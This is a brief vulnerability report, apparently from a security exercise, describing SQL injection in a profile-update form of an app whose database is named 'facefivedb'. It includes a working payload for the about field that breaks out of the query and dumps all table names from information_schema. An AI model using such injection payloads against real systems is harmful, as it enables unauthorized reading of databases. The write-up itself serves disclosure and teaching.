# Vulnerability 5: SQL Injection in name form allows arbitrary read from database

- Vulnerability: SQL Injection
- Where: Update profile form fields (name, new\_password, about, photo)
- Impact: Allows reading all the tables names and the schema of the db


## Steps to reproduce

1. Update user's profile:
    1.1. Change the about field to:
    ```
    ', about=(
        SELECT tables
        FROM (
            SELECT "" AS g, group\_concat(table\_name) AS tables
            FROM (
                SELECT table\_name
                FROM information\_schema.tables
                WHERE table\_schema = 'facefivedb'
            ) AS T2
            GROUP BY g
        ) AS T1
    ) WHERE username = 'asdf'#
    ```

## Notes
Here we created a query that allowed us to read several rows and columns at the same time

[(POC)](profile_2.py)